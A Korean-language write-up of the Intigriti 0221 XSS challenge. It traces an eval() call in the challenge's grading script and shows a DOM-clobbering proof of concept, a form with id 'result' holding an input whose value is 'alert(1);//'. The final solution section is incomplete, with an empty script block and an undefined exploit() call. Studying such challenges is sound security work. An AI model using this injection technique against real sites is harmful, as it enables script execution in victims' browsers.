# Analysis

```js
function startGrade() {
  var text = document.getElementById("assignmentText").value;
  checkLength(text);
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  }; //If the result object hasn't been defined yet, the submission must be too short
  if (result.error) {
    endGrade();
  } else {
    getQAnswer();
    if (!passQuiz()) {
      result.message = "We don't allow robots at the Unicodeversity (yet)!";
      result.error = 1;
    } else {
      result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
    }
    endGrade();
  }
}

function endGrade() {
  document.getElementById("message").innerText = result.message;
  if (result.grade) {
    document.getElementById(
      "grade"
    ).innerText = `You got a(n) ${result.grade}!`;
  }
  document.getElementById("share").style.visibility = "initial";
  document.getElementById(
    "share-link"
  ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${
    document.getElementById("assignmentTitle").value
  }&assignmentText=${document.getElementById("assignmentText").value}`;
  delete result;
}

function checkLength(text) {
  if (text.length > 50) {
    result = { message: "Thanks for your submission!" };
  }
}

function getQAnswer() {
  var answer = document.getElementById("answer").value;
  if (/^[0-9]+$/.test(answer)) {
    if (typeof result !== "undefined") {
      result.questionAnswer = { value: answer };
    } else {
      result = { questionAnswer: { value: answer } };
    }
  }
}

function passQuiz() {
  if (typeof result.questionAnswer !== "undefined") {
    return eval(result.questionAnswer.value + " == " + question);
  }
  return false;
}

var question = `${Math.floor(Math.random() * 10) + 1} + ${
  Math.floor(Math.random() * 10) + 1
}`;

document.getElementById("question").innerText = `${question} = ?`;

document.getElementById("submit").addEventListener("click", startGrade);

const urlParams = new URLSearchParams(location.search);
if (urlParams.has("autosubmit")) {
  startGrade();
}
``` 
`passQuiz()` 함수를 보면 `result.questionAnswer.value`와 `question`의 값을 가져와서 `eval()` 함수로 실행 시켜주는 것을 볼 수 있다.

```js
function startGrade() {
  var text = document.getElementById("assignmentText").value;
  checkLength(text);
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  }; //If the result object hasn't been defined yet, the submission must be too short
  if (result.error) {
    endGrade();
  } else {
    getQAnswer();
    if (!passQuiz()) {
      result.message = "We don't allow robots at the Unicodeversity (yet)!";
      result.error = 1;
    } else {
      result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
    }
    endGrade();
  }
}
```
그래서 `result`가 어디서 정의 되는 지 확인을 해보니, `startGrade()` 함수에서 `window.result` 또는 `~~~` 값을 `result`의 값으로 넣어주는 것을 확인 할 수 있다.

```js
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  };
```
`eval()` 함수 내부에서는 `result.questionAnswer.value` 값을 이용하는 것을 볼 수 있었다. 그렇기 때문에 window.result의 값으로 우리가 원하는 값을 넣어주면 된다. 위와 같이 특정 객체의 프로퍼티를 이용해서 값을 긁어 오는 경우 Dom Clobbering을 이용해서 값을 조작할 수 있다.

```html
<form id='result'><input id='questionAnswer' value='alert(1);//'></form>
<script>
    result = window.result || {
        message: "Your submission is too short.",
        error: 1,
    };

    (function passQuiz() {
        if (typeof result.questionAnswer !== "undefined") {
            return eval(result.questionAnswer.value + " == ");
        }
            return false;
    })();
</script>
```
간단한 `POC`를 작성해보면 위와 같다.

![](https://github.com/wjddnjs33/Exploit/blob/main/wargame/xss%20challenge/Intigriti%200221/images/1.png?raw=true)

`POC`를 실행 해보면 `XSS`가 트리거 되는 것을 확인 할 수 있다. 그렇기에 `Tag Injection` 취약점을 찾아서 Dom Clobbering을 해주면 된다.

---
# Sollution

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Intigriti 0221 Poc</title>
        <script>
 
        </script>
    </head>
    <body>
        <h1>Intigriti XSS Challenge 0221</h1>

        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <input type="button" onclick=exploit() value="Trigger">
    </body>
</html>
```
